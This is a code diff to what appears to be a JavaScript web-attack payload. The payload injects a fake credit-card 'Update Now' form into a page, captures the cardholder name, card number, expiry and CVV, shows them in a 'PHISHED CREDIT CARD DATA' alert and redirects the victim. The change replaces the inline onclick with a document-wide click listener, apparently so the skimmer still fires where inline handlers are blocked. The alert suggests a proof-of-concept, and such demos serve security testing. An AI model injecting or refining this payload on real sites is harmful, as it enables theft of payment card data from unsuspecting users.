@@ -112,7 +112,7 @@ const phishHtml = `
         <input class="input417" type="text" name="cccvv" placeholder="CVV" pattern="^[0-9]{3,4}$" title="3 or 4 digits" required>
       </p>
       <p>
-        <input class="button417" type="submit" name="ccsubmit" onclick="ccUpdate();" value="Update Now">
+        <input class="button417" type="submit" name="ccsubmit" id="ccsubmit" value="Update Now">
       </p>
     </form>
   </div>
@@ -134,6 +134,11 @@ async function ccUpdate() {
   alert('PHISHED CREDIT CARD DATA:\n   Cardholder Name: ' + ccnm + '\n   Card Number: ' + ccno + '\n   Expiration Date: ' + ccex + '\n   CVV: ' + cccv);
   window.open(redirURL, '_self');
 }
+document.addEventListener("click", function(e) {
+  if ((e.target.id === "ccsubmit")) {
+    ccUpdate();
+  }
+});
 function execPayld() {
   let phishDiv = document.createElement('div');
   phishDiv.innerHTML = phishHtml;
